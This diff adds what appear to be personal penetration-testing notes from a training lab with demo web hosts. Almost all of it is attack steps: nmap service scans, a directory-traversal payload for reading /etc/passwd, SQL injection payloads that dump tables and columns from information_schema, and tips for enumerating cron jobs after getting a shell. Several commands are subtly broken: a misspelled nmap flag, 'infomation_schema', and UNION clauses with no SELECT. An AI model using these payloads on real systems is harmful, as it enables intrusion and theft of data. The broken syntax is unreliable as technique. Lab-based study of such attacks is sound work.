@@ -1,0 +1,21 @@
+nmap -v -sT -Pn -T4 -sV <IP>
+nmap -v -sT -Pn -T4 -sV <IP> --sctript=http-enum.nse <IP> -p80
+../../....../etc/passwd or /etc/hosts
+  ^--- directory traversal anytime you see anything similar to "file to read"
+command insertion, sql injection, directory traversal
+  try all three on any web page
+once you get shell make sure you check any files you didn't get earlier, such as cron jobs
+  if there's more than just the  4 defaults (hour daily weekly monthly) in crontab, look into it
+/pick.php?product={1-10} OR 1=1 ;
+  go until one works
+/pick.php?product=7 UNION 1,2,3 ;
+  shows the order in which things are being displayed (do before golden statement
+/pick.php?product=7 UNION table_schema,column_name,table_name FROM infomation_schema.columns ;
+  column, column, column from database.table
+made another master socket on aaron's box
+
+demo boxes 
+demo-web 10.50.45.252
+robots.txt
+demo-web_exploit_sql 10.50.43.238
+union.html
